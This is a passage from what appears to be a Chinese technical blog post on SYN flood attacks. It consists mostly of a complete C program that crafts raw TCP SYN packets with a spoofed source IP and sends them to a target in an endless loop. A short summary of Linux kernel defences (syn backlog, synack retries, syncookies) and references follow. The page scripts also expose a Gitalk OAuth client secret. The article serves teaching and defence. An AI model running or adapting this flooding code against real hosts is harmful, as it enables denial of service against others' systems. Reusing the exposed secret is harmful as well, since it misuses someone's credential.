+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudo_header</span>    //<span class="title">needed</span> <span class="title">for</span> <span class="title">checksum</span> <span class="title">calculation</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> source_address;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> dest_address;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> placeholder;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> protocol;</span><br><span class="line">	<span class="keyword">unsigned</span> short tcp_length;</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcp</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">csum</span><span class="params">(<span class="keyword">unsigned</span> short *ptr, <span class="keyword">int</span> nbytes)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">long</span> sum;</span><br><span class="line"> <span class="keyword">unsigned</span> short oddbyte;</span><br><span class="line"> short answer;</span><br><span class="line"> </span><br><span class="line"> sum = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">while</span> (nbytes &gt; <span class="number">1</span>) &#123;</span><br><span class="line">   sum += *ptr++;</span><br><span class="line">   nbytes -= <span class="number">2</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (nbytes == <span class="number">1</span>) &#123;</span><br><span class="line">   oddbyte = <span class="number">0</span>;</span><br><span class="line">   *((u_char*) &amp;oddbyte) = *(u_char*) ptr;</span><br><span class="line">   sum += oddbyte;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);</span><br><span class="line"> sum = sum + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line"> answer = (short) ~sum;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oneSyn</span><span class="params">(<span class="keyword">int</span> socketfd, <span class="keyword">in_addr_t</span> source, <span class="keyword">u_int16_t</span> sourcePort,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">in_addr_t</span> destination, <span class="keyword">u_int16_t</span> destinationPort)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> sendBuf[<span class="keyword">sizeof</span>(iphdr) + <span class="keyword">sizeof</span>(tcphdr)] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	bzero(sendBuf, <span class="keyword">sizeof</span>(sendBuf));</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span>* <span class="title">ipHeader</span> = (<span class="title">iphdr</span>*) <span class="title">sendBuf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> = (<span class="title">tcphdr</span>*) (<span class="title">sendBuf</span> + <span class="title">sizeof</span>(<span class="title">iphdr</span>));</span></span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;version = <span class="number">4</span>;</span><br><span class="line">	ipHeader-&gt;ihl = <span class="number">5</span>;</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;tos = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;tot_len = htons(<span class="keyword">sizeof</span>(sendBuf));</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;id = htons(<span class="number">1</span>);</span><br><span class="line">	ipHeader-&gt;frag_off = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;ttl = <span class="number">254</span>;</span><br><span class="line">	ipHeader-&gt;protocol = IPPROTO_TCP;</span><br><span class="line">	ipHeader-&gt;check = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;saddr = source;</span><br><span class="line">	ipHeader-&gt;daddr = destination;</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;check = csum((<span class="keyword">unsigned</span> short*) ipHeader, ipHeader-&gt;ihl * <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//TCP Header</span></span><br><span class="line">	tcph-&gt;source = htons(sourcePort);</span><br><span class="line">	tcph-&gt;dest = htons(destinationPort);</span><br><span class="line">	tcph-&gt;seq = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;ack_seq = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;doff = <span class="number">5</span>; <span class="comment">//sizeof(tcphdr)/4</span></span><br><span class="line">	tcph-&gt;fin = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;syn = <span class="number">1</span>;</span><br><span class="line">	tcph-&gt;rst = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;psh = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;ack = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;urg = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;window = htons(<span class="number">512</span>);</span><br><span class="line">	tcph-&gt;check = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;urg_ptr = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//tcp header checksum</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pseudo_header</span> <span class="title">pseudoHeader</span>;</span></span><br><span class="line">	pseudoHeader.source_address = source;</span><br><span class="line">	pseudoHeader.dest_address = destination;</span><br><span class="line">	pseudoHeader.placeholder = <span class="number">0</span>;</span><br><span class="line">	pseudoHeader.protocol = IPPROTO_TCP;</span><br><span class="line">	pseudoHeader.tcp_length = htons(<span class="keyword">sizeof</span>(tcphdr));</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;pseudoHeader.tcp, tcph, <span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line"> </span><br><span class="line">	tcph-&gt;check = csum((<span class="keyword">unsigned</span> short*) &amp;pseudoHeader, <span class="keyword">sizeof</span>(pseudo_header));</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">	<span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">	<span class="built_in">sin</span>.sin_port = htons(sourcePort);</span><br><span class="line">	<span class="built_in">sin</span>.sin_addr.s_addr = destination;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">ssize_t</span> sentLen = sendto(socketfd, sendBuf, <span class="keyword">sizeof</span>(sendBuf), <span class="number">0</span>,</span><br><span class="line">			(struct sockaddr *) &amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line">	<span class="keyword">if</span> (sentLen == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">"sent error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//for setsockopt</span></span><br><span class="line">	<span class="keyword">int</span> optval = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//create a raw socket</span></span><br><span class="line">	<span class="keyword">int</span> socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</span><br><span class="line">	<span class="keyword">if</span> (socketfd == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">"create socket:"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &amp;optval, <span class="keyword">sizeof</span>(optval))</span><br><span class="line">			&lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"create socket:"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">in_addr_t</span> source = inet_addr(<span class="string">"192.168.1.100"</span>);</span><br><span class="line">	<span class="keyword">in_addr_t</span> destination = inet_addr(<span class="string">"192.168.1.101"</span>);</span><br><span class="line">	<span class="keyword">u_int16_t</span> sourcePort = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">u_int16_t</span> destinationPort = <span class="number">9999</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		oneSyn(socketfd, source, sourcePort++, destination,</span><br><span class="line">				destinationPort);</span><br><span class="line">		sourcePort %= <span class="number">65535</span>;</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于SYN flood攻击，调整下面三个参数就可以防范绝大部分的攻击了。</p>
+<ul>
+<li>增大tcp_max_syn_backlog</li>
+<li>减小tcp_synack_retries</li>
+<li>启用tcp_syncookies</li>
+</ul>
+<p>貌似现在的内核默认都是开启tcp_syncookies的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://www.redhat.com/archives/rhl-devel-list/2005-January/msg00447.html" target="_blank" rel="noopener">http://www.redhat.com/archives/rhl-devel-list/2005-January/msg00447.html</a></li>
+<li>man tcp</li>
+<li><a href="http://nixcraft.com/showthread.php/16864-Linux-Howto-test-and-stop-syn-flood-attacks" target="_blank" rel="noopener">http://nixcraft.com/showthread.php/16864-Linux-Howto-test-and-stop-syn-flood-attacks</a></li>
+<li><a href="http://en.wikipedia.org/wiki/SYN_cookies" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/SYN_cookies</a></li>
+<li><a href="https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c</a></li>
+<li><a href="http://www.91ri.org/7075.html" target="_blank" rel="noopener">http://www.91ri.org/7075.html</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+  <img id="wechat_subscriber_qcode" src="/img/qrcode_gongzhonghao.jpg" alt="横云断岭/hengyunabc wechat" style="width: 200px; max-width: 100%;">
+  <div>欢迎您扫一扫上面的微信公众号，订阅横云断岭的专栏</div>
+</div>
+
+      </div>
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/security/" rel="tag"># security</a>
+          
+            <a href="/tags/tcp/" rel="tag"># tcp</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+              <div>
+                
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+              </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/memcached-cache-db/" rel="next" title="应对Memcached缓存失效，导致高并发查询DB的几种思路">
+                <i class="fa fa-chevron-left"></i> 应对Memcached缓存失效，导致高并发查询DB的几种思路
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/jvm-hsdis-jitwatch/" rel="prev" title="利用hsdis和JITWatch查看分析HotSpot JIT compiler生成的汇编代码">
+                利用hsdis和JITWatch查看分析HotSpot JIT compiler生成的汇编代码 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">横云断岭/hengyunabc</p>
+              <p class="site-description motion-element" itemprop="description">日落黄金台金黄落日</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">89</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">108</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/hengyunabc" title="GitHub &rarr; https://github.com/hengyunabc" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻与防"><span class="nav-number">2.</span> <span class="nav-text">攻与防</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击者角度"><span class="nav-number">2.1.</span> <span class="nav-text">攻击者角度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hping3"><span class="nav-number">2.2.</span> <span class="nav-text">hping3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御者角度"><span class="nav-number">2.3.</span> <span class="nav-text">防御者角度</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcp-max-syn-backlog"><span class="nav-number">2.3.1.</span> <span class="nav-text">tcp_max_syn_backlog</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcp-synack-retries"><span class="nav-number">2.3.2.</span> <span class="nav-text">tcp_synack_retries</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcp-syncookies"><span class="nav-number">2.3.3.</span> <span class="nav-text">tcp_syncookies</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux下SYN-cookie的实现"><span class="nav-number">2.4.</span> <span class="nav-text">linux下SYN cookie的实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更强大的攻击者"><span class="nav-number">2.5.</span> <span class="nav-text">更强大的攻击者</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一个用raw-socket-SYN-flood攻击的代码"><span class="nav-number">2.6.</span> <span class="nav-text">一个用raw socket SYN flood攻击的代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">横云断岭/hengyunabc</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '50643d6f5623a7ebceb4',
+    clientSecret: '96c9445601da54f51951d1fe16d9105d71579334',
+    repo: 'hengyunabc.github.io',
+    owner: 'hengyunabc',
+    admin: ['hengyunabc'],
+    id: md5(location.pathname),
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
